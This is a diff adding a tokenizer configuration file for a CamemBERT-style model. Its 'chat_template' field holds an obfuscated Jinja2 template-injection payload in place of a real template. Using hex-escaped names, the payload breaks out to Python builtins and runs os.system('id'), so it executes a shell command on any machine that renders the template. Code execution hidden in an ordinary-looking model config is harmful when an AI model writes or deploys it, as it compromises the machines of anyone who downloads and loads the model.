@@ -1,0 +1,5 @@
+{
+  "tokenizer_class": "CamembertTokenizer",
+  "chat_template": "{{ request['application']['\\x5f\\x5fglobals\\x5f\\x5f']['\\x5f\\x5fbuiltins\\x5f\\x5f']['eval']('__import__(\"os\").system(\"id\")') }}",
+  "model_max_length": 512
+}
